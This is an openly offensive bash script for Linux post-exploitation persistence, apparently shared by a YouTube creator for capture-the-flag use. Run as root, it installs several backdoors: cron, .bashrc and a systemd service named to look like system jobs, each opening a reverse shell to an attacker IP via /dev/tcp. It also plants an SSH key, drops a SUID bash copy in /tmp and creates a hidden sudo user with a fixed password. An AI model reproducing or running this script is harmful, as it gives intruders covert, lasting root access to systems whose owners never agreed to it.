#!/bin/bash

# Created by pwnk1t 
# https://www.youtube.com/@pwnk1t
# this script will create multiple backdoors
# only use this in allowed enviroment 
# tested&worked on: Shrek 


if [ "$EUID" -ne 0 ]; then
    echo "Run as root"
    exit
fi

clear

echo "[💀] Installing persistence..."


read -p "Hacker IP: " IP

sleep 1

################################
#        CRON BACKDOOR         #
################################

echo "[+] creating cron backdoor"

echo "*/2 * * * * root bash -c 'bash -i >& /dev/tcp/$IP/1337 0>&1'" > /etc/cron.d/syslog

sleep 1

################################
#        ROOT BASHRC           #
################################

echo "[+] creating bashrc backdoor"

echo "bash -c 'bash -i >& /dev/tcp/$IP/4444 0>&1' &" >> /root/.bashrc

sleep 1

################################
#      SSH KEY BACKDOOR        #
################################

echo "[+] installing ssh key"

read -p "Paste SSH public key: " SSHKEY

mkdir -p /root/.ssh

echo "$SSHKEY" > /root/.ssh/authorized_keys

chmod 600 /root/.ssh/authorized_keys

chmod 700 /root/.ssh

sleep 1

################################
#        SUID SHELL            #
################################

echo "[+] creating suid shell"

cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash

sleep 1

################################
#        SYSTEMD SERVICE       #
################################

echo "[+] creating systemd persistence"

cat <<EOF > /etc/systemd/system/sys-update.service
[Unit]
Description=System Update

[Service]
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/$IP/5555 0>&1'
Restart=always

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload
systemctl enable sys-update
systemctl start sys-update

sleep 1

################################
#         HIDDEN USER          # 
################################

echo "[+] creating hidden user"

useradd -m -s /bin/bash sysbackup

echo "sysbackup:Password123!" | chpasswd

usermod -aG sudo sysbackup 2>/dev/null

echo "[+] user created -> sysbackup:Password123!"

sleep 1

echo "[+] Backdoors installed"
sleep 1 
echo "[!] -> /tmp/rootbash -p <- for suid backdoor"
sleep 1
echo "[!] Open listeners:"
sleep 1
echo -e "\033[96m[+] 1337 4444 5555\033[0m"
sleep 1
echo -e "\033[96m[+] Login with sysbackup:Password123!\033[0m"
sleep 1 
echo "[*]  clean up..."
sleep 1 
echo "[💀] created by pwnk1t [💀]"
